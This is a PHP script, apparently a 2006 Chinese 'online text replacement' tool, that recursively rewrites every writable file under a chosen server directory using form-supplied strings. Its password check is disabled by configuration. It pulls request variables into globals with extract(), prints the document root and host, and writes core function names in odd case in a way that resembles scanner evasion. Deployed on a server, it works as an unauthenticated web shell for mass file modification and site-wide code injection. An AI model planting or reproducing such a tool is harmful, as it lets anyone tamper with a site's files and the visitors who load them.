<?php



$info="PHP在线网页文本替换 Labs.net.cn";

error_reporting(7);

ob_start();

$mtime = explode(' ', microtime());

$starttime = $mtime[1] + $mtime[0];



/*===================== 程序配置 =====================*/



// 是否需要密码验证,1为需要验证,其他数字为直接进入.下面选项则无效

$admin['check'] = "shishi";

// 如果需要密码验证,请修改登陆密码

$admin['pass']  = "labs.net.cn";



/*===================== 配置结束 =====================*/



// 允许程序在 register_globals = off 的环境下工作

$onoff = (function_exists('ini_get')) ? ini_get('register_globals') : get_cfg_var('register_globals');



if ($onoff != 1) {

	@extract($_POST, EXTR_SKIP);

	@extract($_GET, EXTR_SKIP);

}



$self = $_SERVER['PHP_SELF'];

$dis_func = get_cfg_var("disable_functions");



/*===================== 身份验证 =====================*/



if($admin['check'] == "1") {

	if ($_GET['action'] == "logout") {

		setcookie ("adminpass", "");

		echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$self."\">";

		echo "<span style=\"font-size: 12px; font-family: Verdana\">注销成功......<p><a href=\"".$self."\">三秒后自动退出或单击这里退出程序界面 &gt;&gt;&gt;</a></span>";

		exit;

	}



	if ($_POST['do'] == 'login') {

		$thepass=trim($_POST['adminpass']);

		if ($admin['pass'] == $thepass) {

			setcookie ("adminpass",$thepass,time()+(1*24*3600));

			echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$self."\">";

			echo "<span style=\"font-size: 12px; font-family: Verdana\">登陆成功......<p><a href=\"".$self."\">三秒后自动跳转或单击这里进入程序界面 &gt;&gt;&gt;</a></span>";

			exit;

		}

	}

	if (isset($_COOKIE['adminpass'])) {

		if ($_COOKIE['adminpass'] != $admin['pass']) {

			loginpage();

		}

	} else {

		loginpage();

	}

}

/*===================== 验证结束 =====================*/

?>

<html>

<head>

<title><?php echo $info;?></title>

<style type="text/css">

body{

	font-size:12px;

	font-family:"MS Sans Serif", "Helvetica", "sans-serif";

	text-align:center;

	margin:0 0 0 0;



}

textarea {

	font: 12px "Verdana", "Tahoma", "sans-serif";

	padding: 4px;

}

input {font-family: "Verdana";font-size: "11px";BACKGROUND-COLOR: "#FFFFFF";height: "18px";border: "1px solid #666666";}

form{

margin:0 0 0 0;

}

div{

padding:2 5 2 5;

margin:2 2 2 2;

}

a:link,a:visited,a:active {

	color: "#000000";

	text-decoration: underline;

}

a:hover {

	color: "#465584";

	text-decoration: none;

}

.main{

	width:800;

	height:;

	text-align:left;

}

.header{

	width:100%;

}

.title{

	font-weight:bold;

	float:left;

}

.menu{

	float:right

}

.msg{

	border-top:1px solid #000000;

}

.about{

	border-top:1px solid #000000;

	width:100%;

}

.step{

	border-top:1px solid #000000;

	width:100%;

}

.text{



}

.form{

	border-top:1px solid #000000;

}

.item{

	width:100%;

	text-align:center;

}

.button{

	width:100%;

	text-align:center;

}

.footer{

	margin-top:20;

	width:100%;

	border-top:1px solid #000000;

}

.copyright{

float:left;

}

.run{

float:right;

}

</style>

</head>

<body>





<?php

/*

//调试用

echo "<pre>\n";

echo "_POST\n";

print_r($_POST);

echo "_GET\n";

print_r($_GET);

echo "</pre>\n";

*/

?>





<div class="main">

<div class="header"><div class="title"><?php echo $info;?></div><div class="menu">

<?php

if($admin['check'] == "1"){?>

<a href="?action=logout">注销</a><?php }

?>

</div>

</div>

<div class="msg">

<?php



if($_GET['action']=="replace"){

	if(!$_POST['submit']){	

		$_POST['dir']==""?$dir=".":$dir=$_POST['dir'];		//设定目录

		$count=$_POST['count'];

//调用函数

		listfiles($dir);

		echo "<font color=\"red\">替换完毕!</font><br>\n";

	

	}

}

else if($_GET['action']=="post"){

	$count=$_POST['count'];

	info();

}

else{

	if(empty($count))$count=1;else $count=$_GET['count'];

	info();

}

if($count<1)$count=1;

?>

</div>

<div class="about">

Coze by <a href="http://labs.net.cn">Labs.Net.cn</a><br />

Last update on Dec 30 2006<br />

</div>

<div class="step">

使用方法:

<ol>

<li>

在替换之前请将要替换的文件属性全部修改为 0777 (WINDOWS服务器可以省略此步骤)

</li>

<li>

修改替换个数

</li>

<li>

设定将要替换的目录

</li>

<li>

设定替换文件的后缀

</li>

<li>

...

</li>

</ol>

<font color="red">注意:慎用本程序,一旦出错将可能无法恢复,使用完毕请立即删除,造成任何后果自负.</font>
<?php 
echo  "<br>".$_SERVER['DOCUMENT_ROOT']."<br>"; 
?>

</div>

<div class="form">

	<div class="text">

	<form id="form1" name="form1" method="post" action="?action=post">

 		<label>替换个数:

 		<input name="count" type="text" maxlength="3" />

 		</label>

 		<label>

	 	<input type="submit" name="Submit" value=" 修改 "  />

	 	</label>

	</form>

	</div>

		<form name="form" method="post" action="?action=replace">

	<div class="text">

		<input name="count" type="hidden" value="<?php echo $count; ?>">

		<label>目标目录:

		<input type="text" name="dir" value="" />

		将要替换的目录,例:dir/dirname</label>

	</div>

	<div class="text">

		<label>文件类型:

		<input type="text" name="type" value="" />

		请填写文件后缀,多种后缀请用"|"分隔,例:txt|html|htm,留空为替换全部类型</label>

	</div>

	<div class="text">

<?php

for($i=1;$i<=$count;$i++){

	print("<div class=\"item\"><textarea name=\"a[{$i}]\" cols=\"50\" rows=\"10\"></textarea>  <textarea name=\"b[{$i}]\" cols=\"50\" rows=\"10\"></textarea></div>");

}

?>

	</div>

<div class="button">

<input type="submit" name="Submit" value=" 修改 " />

<input type="reset" name="Submit2" value=" 重置 " />

</div>

		</form>

</div>

<div class="footer">

	<div class="copyright">Copyright (C) 2006 m4ker.net All Rights Reserved.</div>

	<div class="run"><?php

	debuginfo();

	ob_end_flush();	

	?></div></div>

</div>
<?php 
echo $_SERVER['HTTP_HOST']."<br>"; 
?>
</body>

</html>







<?php

/*===================== 定义函数========================*/

function listfiles($dir="."){//遍厉目录并替换

	$hAndle=opendir($dir);//打开目录

	while(fAlse!=($file=reAddir($hAndle))){//阅读目录

		if($file!='.'&&$file!='..'){//列出所有文件并去掉'.'和'..

			if(is_dir("$dir/$file")){//列出文件和目录

				echo "<font color=\"yellow\">$dir/$file</font><br />";//输出目录名[黄色]

				listfiles("$dir/$file");//递归调用

			}

			else if("$dir/$file"!=selfname()){//判断自身

				echo "$dir/$file";//输出文件名

				//读取文件内容

				if(checktype(selftype("$dir/$file"),types($_POST['type'])) and $_POST['type']!=""){

					if(filesize("$dir/$file")>0){

						if(is_writable("$dir/$file")){

							$fp=fopen("$dir/$file","r");

							$con=addslashes ( freAd($fp,filesize("$dir/$file")));

//==========================替换内容

							$con=replace($_POST['a'],$_POST['b'],$con);

							fclose($fp);//关闭文件连接

							$fd=fopen("$dir/$file","w");//打开文件

							$A=fputs($fd,stripslashes ($con));//写入替换后的内容

							fclose($fd);//关闭文件连接

							echo "<br />";

						}

						else{

							echo "<font color=\"red\">&nbsp;不可写</font><br />";

						}

					}

				}

				else if($_POST['type']==""){

					if(filesize("$dir/$file")>0){

						if(is_writable("$dir/$file")){

							$fp=fopen("$dir/$file","r");

							$con=addslashes ( freAd($fp,filesize("$dir/$file")));

//==========================替换内容

							$con=replace($_POST['a'],$_POST['b'],$con);

							fclose($fp);//关闭文件连接

							$fd=fopen("$dir/$file","w");//打开文件

							$A=fputs($fd,stripslashes ($con));//写入替换后的内容

							fclose($fd);//关闭文件连接}

							echo "<br />";

						}

						else{

							echo "<font color=\"red\">&nbsp;不可写</font><br />";

						}

					}

				}

				else{

				echo "<font color=\"red\">&nbsp;类型不匹配</font><br />";

				}

			}

}

}

}

function selfname(){//返回本文件名

	$a=explode("/", $_SERVER['PHP_SELF']);

	return "./".$a[count($a)-1];

}



function selftype($filepath){//返回文件后缀

	$a=explode(".", $filepath);

	return $a[count($a)-1];

}



function checktype($selftype,$type){

	for($i=0;$i<count($type);$i++){

		$a=0;

		if($type[$i]==$selftype){

		$a=1;

		break;

		}

	}

	return $a;

}



function types($types){

	$type=explode("|",$types);

	return $type;

}



function replace($a,$b,$c){

	for($i=1;$i<=count($a);$i++){

		$c=str_replAce($a[$i],$b[$i],$c);

	}

	return $c;

}//end replace()

function info(){

?>

<div align="center">

<a href="http://labs.net.cn" target="_blank">Labs Of China</a>独立开发,可在 <a href="http://labs.net.cn" target="_blank">中国网络实验室</a> 下载最新版本以及提供技术支持</div>

<?php

}

	// 登陆入口

	function loginpage() {

?>

<style type="text/css">

input {font-family: "Verdana";font-size: "11px";BACKGROUND-COLOR: "#FFFFFF";height: "18px";border: "1px solid #666666";}

</style>

<form method="POST" action="">

<font color="red" style="font-size:12px;">默认密码:labs.net.cn,请尽快修改您的密码.</font><br />

<span style="font-size: 11px; font-family: Verdana">Password: </span><input name="adminpass" type="password" size="20">

<input type="hidden" name="do" value="login">

<input type="submit" value="Login">

</form>

<?php

		exit;

	}//end loginpage()

		// 页面调试信息

	function debuginfo() {

		global $starttime;

		$mtime = explode(' ', microtime());

		$totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);

		echo "Processed in $totaltime second(s)";

	}
?> 